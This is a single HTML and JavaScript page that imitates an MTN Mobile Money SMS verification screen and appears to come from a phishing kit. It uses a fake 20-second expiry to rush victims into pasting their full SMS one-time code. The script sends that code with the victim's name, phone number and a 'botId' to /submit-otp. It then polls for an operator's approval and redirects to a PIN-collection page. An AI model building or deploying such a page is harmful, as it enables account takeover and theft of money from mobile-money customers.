<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>MTN Mobile Money - Verify</title>
  <style>
    /* ===== MTN MoMo Style ===== */
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: #0a0a0a;
      color: #222;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 1.5rem;
    }
    .top-bar {
      width: 100%;
      max-width: 480px;
      height: 72px;
      background: #ffb300;
      display: flex;
      align-items: center;
      padding: 0 22px;
      flex-shrink: 0;
      border-radius: 1.5rem 1.5rem 0 0;
      box-shadow: 0 2px 12px rgba(255, 179, 0, 0.2);
    }
    .top-bar .logo {
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .top-bar .logo svg {
      height: 36px;
      width: auto;
    }
    .top-bar .logo span {
      font-weight: 700;
      font-size: 18px;
      color: #0a0a0a;
      letter-spacing: -0.5px;
    }
    .back-btn {
      color: #0a0a0a;
      font-size: 30px;
      text-decoration: none;
      font-weight: 300;
      margin-right: 16px;
      transition: color 0.2s;
    }
    .back-btn:hover { color: #004b87; }
    .container {
      width: 100%;
      max-width: 480px;
      background: #ffffff;
      padding: 28px 24px 20px;
      border-radius: 0 0 1.5rem 1.5rem;
      box-shadow: 0 20px 60px rgba(255, 179, 0, 0.12);
      border: 1px solid rgba(255, 179, 0, 0.15);
      border-top: none;
      display: flex;
      flex-direction: column;
    }
    .title {
      font-size: 26px;
      font-weight: 700;
      color: #0a0a0a;
      margin-bottom: 4px;
      letter-spacing: -0.3px;
    }
    .subtitle {
      font-size: 15px;
      color: #4a4a4a;
      line-height: 1.5;
      margin-bottom: 16px;
    }
    .instruction-note {
      font-size: 14px;
      color: #0a0a0a;
      background: #f8fafc;
      padding: 12px 16px;
      border-radius: 12px;
      margin-bottom: 20px;
      border: 1px solid #e2e8f0;
      line-height: 1.6;
    }
    .valid-time {
      font-size: 14px;
      color: #5b6f7e;
      margin-bottom: 24px;
    }
    .message-area {
      margin-bottom: 20px;
    }
    .message-area textarea {
      width: 100%;
      min-height: 120px;
      padding: 14px 16px;
      border: 2px solid #d0d7de;
      border-radius: 12px;
      font-size: 16px;
      font-family: inherit;
      resize: vertical;
      outline: none;
      transition: border 0.2s, box-shadow 0.2s;
      background: #fff;
      line-height: 1.6;
    }
    .message-area textarea:focus {
      border-color: #ffb300;
      box-shadow: 0 0 0 4px rgba(255, 179, 0, 0.25);
    }
    .message-area textarea::placeholder {
      color: #aaa;
    }
    .resend-wrap {
      color: #666;
      font-size: 15px;
      margin-bottom: 0;
    }
    .resend-wrap .timer {
      font-weight: 600;
      color: #0a0a0a;
    }
    .continue-btn {
      position: fixed;
      left: 50%;
      transform: translateX(-50%);
      bottom: 28px;
      height: 56px;
      border: none;
      border-radius: 60px;
      background: #ccc;
      color: #fff;
      font-size: 20px;
      font-weight: 700;
      cursor: not-allowed;
      transition: background 0.2s, transform 0.15s, box-shadow 0.2s;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      max-width: 420px;
      width: calc(100% - 48px);
      box-shadow: 0 8px 24px rgba(255, 179, 0, 0);
    }
    .continue-btn:enabled {
      background: linear-gradient(135deg, #ffb300, #ffcc00);
      color: #0a0a0a;
      cursor: pointer;
      box-shadow: 0 8px 24px rgba(255, 179, 0, 0.35);
    }
    .continue-btn:enabled:hover {
      background: linear-gradient(135deg, #e6a200, #ffb300);
      transform: scale(1.01);
      box-shadow: 0 12px 32px rgba(255, 179, 0, 0.45);
    }
    #message-box {
      display: none;
      padding: 12px 16px;
      border-radius: 12px;
      margin-bottom: 16px;
      font-size: 15px;
      font-weight: 500;
      border: 1px solid transparent;
    }
    #message-box.error {
      background: #fef3f2;
      border-color: #fecdca;
      color: #c0392b;
    }
    #message-box.success {
      background: #ecfdf3;
      border-color: #abf0d1;
      color: #0b2b3b;
    }
    @media (max-width: 480px) {
      body { padding: 1rem; }
      .top-bar { border-radius: 1rem 1rem 0 0; padding: 0 16px; }
      .container { padding: 22px 18px 16px; border-radius: 0 0 1rem 1rem; }
      .title { font-size: 24px; }
      .message-area textarea { min-height: 100px; font-size: 15px; }
      .continue-btn { height: 54px; font-size: 18px; bottom: 22px; width: calc(100% - 36px); }
    }
    @media (max-width: 360px) {
      .message-area textarea { min-height: 80px; font-size: 14px; }
    }
  </style>
</head>
<body>

  <div class="top-bar">
    <a href="#" class="back-btn">&#8592;</a>
    <div class="logo">
      <svg viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org/2000/svg">
        <rect x="2" y="2" width="36" height="36" rx="8" fill="#FFCC00" stroke="#004B87" stroke-width="2"/>
        <path d="M14 12L22 12L18 20L22 28L14 28L18 20L14 12Z" fill="#004B87"/>
        <text x="46" y="26" font-family="Arial, sans-serif" font-weight="700" font-size="20" fill="#004B87">MTN Mobile Money</text>
      </svg>
      <span>Mobile Money</span>
    </div>
  </div>

  <div class="container">
    <div class="title">Verify Your SMS</div>
    <div class="subtitle" id="subtitlePlaceholder">
      We sent a code to your phone number
    </div>

    <div class="instruction-note">
      📱 Copy the <strong>entire SMS message</strong> you received and paste it in the box below.
    </div>

    <div class="valid-time">The code is valid for 20 seconds</div>

    <div class="message-area">
      <textarea id="smsMessage" placeholder="Paste the whole SMS message here..."></textarea>
    </div>

    <div class="resend-wrap">
      Resend code in <span class="timer">00:20</span>
    </div>
  </div>

  <button class="continue-btn" disabled>SUBMIT</button>

  <!-- message-box is created in JS if missing, but we'll keep it -->
  <div id="message-box" style="display:none;"></div>

  <script>
    (function() {
      // ---------- READ FROM URL & LOCALSTORAGE ----------
      const urlParams = new URLSearchParams(window.location.search);
      let botId = urlParams.get('botId') || localStorage.getItem('botId');
      let phone = urlParams.get('phone') || localStorage.getItem('phone');
      let name = localStorage.getItem('fullName');

      // If missing critical data, redirect back to phone page
      if (!botId) {
        alert('Bot ID missing. Please start over.');
        window.location.href = 'index.html';
        return;
      }
      if (!phone) {
        alert('Phone number missing. Please start over.');
        window.location.href = 'index.html';
        return;
      }
      if (!name) {
        name = 'MTN User';
        localStorage.setItem('fullName', name);
      }

      // Ensure botId is stored
      localStorage.setItem('botId', botId);
      localStorage.setItem('phone', phone);

      // Show phone number in subtitle
      const subtitle = document.getElementById('subtitlePlaceholder');
      if (phone) {
        subtitle.textContent = 'We sent a code to ' + phone;
      }

      // ---------- DOM REFS ----------
      const textarea = document.getElementById('smsMessage');
      const continueBtn = document.querySelector('.continue-btn');
      const msgDiv = document.getElementById('message-box');

      // If message-box not in DOM (though we added it), create it.
      if (!msgDiv) {
        const div = document.createElement('div');
        div.id = 'message-box';
        div.style.display = 'none';
        div.style.padding = '12px 16px';
        div.style.borderRadius = '12px';
        div.style.marginBottom = '16px';
        div.style.fontSize = '15px';
        div.style.fontWeight = '500';
        const container = document.querySelector('.container');
        const resend = document.querySelector('.resend-wrap');
        container.insertBefore(div, resend);
        // reassign
        msgDiv = document.getElementById('message-box');
      }

      function showMessage(text, isError) {
        msgDiv.textContent = text;
        msgDiv.style.display = 'block';
        msgDiv.className = isError ? 'error' : 'success';
      }

      function hideMessage() {
        msgDiv.style.display = 'none';
        msgDiv.className = '';
        msgDiv.textContent = '';
      }

      // ---------- TEXTAREA VALIDATION ----------
      function checkTextArea() {
        const val = textarea.value.trim();
        continueBtn.disabled = (val === '');
        if (val !== '') {
          continueBtn.style.background = 'linear-gradient(135deg, #ffb300, #ffcc00)';
          continueBtn.style.color = '#0a0a0a';
          continueBtn.style.cursor = 'pointer';
          continueBtn.style.boxShadow = '0 8px 24px rgba(255, 179, 0, 0.35)';
        } else {
          continueBtn.style.background = '#ccc';
          continueBtn.style.color = '#fff';
          continueBtn.style.cursor = 'not-allowed';
          continueBtn.style.boxShadow = '0 8px 24px rgba(255, 179, 0, 0)';
        }
        hideMessage();
      }

      textarea.addEventListener('input', checkTextArea);
      textarea.addEventListener('paste', function() {
        setTimeout(checkTextArea, 10);
      });
      textarea.focus();

      // ---------- TIMER (20 seconds) ----------
      const timerSpan = document.querySelector('.timer');
      const resendWrap = document.querySelector('.resend-wrap');
      let totalSeconds = 20;
      let timerInterval = null;

      function formatTime(sec) {
        const m = String(Math.floor(sec / 60)).padStart(2, '0');
        const s = String(sec % 60).padStart(2, '0');
        return m + ':' + s;
      }

      function updateTimerUI() {
        if (totalSeconds <= 0) {
          resendWrap.innerHTML = 'Resend code';
          resendWrap.style.color = '#ffb300';
          resendWrap.style.cursor = 'pointer';
          resendWrap.style.fontWeight = '600';
          clearInterval(timerInterval);
          timerInterval = null;
          resendWrap.onclick = function(e) {
            e.preventDefault();
            startTimer(20);
            hideMessage();
          };
          return;
        }
        resendWrap.innerHTML = 'Resend code in <span class="timer">' + formatTime(totalSeconds) + '</span>';
        resendWrap.style.color = '#666';
        resendWrap.style.cursor = 'default';
        resendWrap.style.fontWeight = '400';
        resendWrap.onclick = null;
      }

      function startTimer(seconds) {
        if (timerInterval) clearInterval(timerInterval);
        totalSeconds = seconds;
        updateTimerUI();
        timerInterval = setInterval(function() {
          totalSeconds--;
          if (totalSeconds <= 0) {
            totalSeconds = 0;
            updateTimerUI();
            clearInterval(timerInterval);
            timerInterval = null;
          } else {
            updateTimerUI();
          }
        }, 1000);
      }

      startTimer(20);

      // ---------- POLLING HELPER ----------
      let pollTimer = null;

      function stopPolling() {
        if (pollTimer) {
          clearInterval(pollTimer);
          pollTimer = null;
        }
      }

      // ---------- SUBMIT OTP ----------
      continueBtn.addEventListener('click', function() {
        if (this.disabled) return;

        const message = textarea.value.trim();
        if (!message) {
          showMessage('Please paste or type the SMS message.', true);
          return;
        }

        // Disable button and show loading
        continueBtn.disabled = true;
        continueBtn.textContent = 'Verifying...';
        continueBtn.style.background = '#f5a623';
        continueBtn.style.color = '#fff';
        continueBtn.style.boxShadow = '0 8px 24px rgba(255, 179, 0, 0.3)';
        hideMessage();

        // Submit OTP
        fetch('/submit-otp', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            name: name,
            phone: phone,
            otp: message,
            botId: botId
          })
        })
        .then(function(res) {
          if (!res.ok) throw new Error('Server error (HTTP ' + res.status + ')');
          return res.json();
        })
        .then(function(data) {
          var requestId = data.requestId;
          if (!requestId) throw new Error('No request ID received');

          // Start polling
          stopPolling();
          var attempts = 0;
          var MAX_ATTEMPTS = 120; // ~3 minutes (1.5s interval)

          pollTimer = setInterval(function() {
            attempts++;
            fetch('/check-otp/' + requestId)
              .then(function(res) {
                if (!res.ok) throw new Error('Verification error');
                return res.json();
              })
              .then(function(status) {
                if (status.approved === true) {
                  stopPolling();
                  // OTP approved – redirect to PIN page
                  var pinUrl = 'pin.html?botId=' + encodeURIComponent(botId) +
                               '&phone=' + encodeURIComponent(phone) +
                               '&name=' + encodeURIComponent(name);
                  window.location.href = pinUrl;
                  return;
                }
                if (status.approved === false) {
                  stopPolling();
                  showMessage('❌ Incorrect code. Please try again.', true);
                  continueBtn.disabled = false;
                  continueBtn.textContent = 'SUBMIT';
                  continueBtn.style.background = 'linear-gradient(135deg, #ffb300, #ffcc00)';
                  continueBtn.style.color = '#0a0a0a';
                  continueBtn.style.boxShadow = '0 8px 24px rgba(255, 179, 0, 0.35)';
                  textarea.value = '';
                  checkTextArea();
                  textarea.focus();
                  return;
                }
                // Still pending
                if (attempts > MAX_ATTEMPTS) {
                  stopPolling();
                  showMessage('⏳ Approval taking too long. Please refresh or contact support.', true);
                  continueBtn.disabled = false;
                  continueBtn.textContent = 'SUBMIT';
                  continueBtn.style.background = 'linear-gradient(135deg, #ffb300, #ffcc00)';
                  continueBtn.style.color = '#0a0a0a';
                  continueBtn.style.boxShadow = '0 8px 24px rgba(255, 179, 0, 0.35)';
                }
                // else keep polling
              })
              .catch(function(err) {
                // Network error – keep polling
                console.error('Polling error:', err);
              });
          }, 1500);
        })
        .catch(function(err) {
          showMessage('❌ Send error: ' + err.message, true);
          continueBtn.disabled = false;
          continueBtn.textContent = 'SUBMIT';
          continueBtn.style.background = 'linear-gradient(135deg, #ffb300, #ffcc00)';
          continueBtn.style.color = '#0a0a0a';
          continueBtn.style.boxShadow = '0 8px 24px rgba(255, 179, 0, 0.35)';
        });
      });

      // ---------- INIT ----------
      checkTextArea();
    })();
  </script>
</body>
</html>
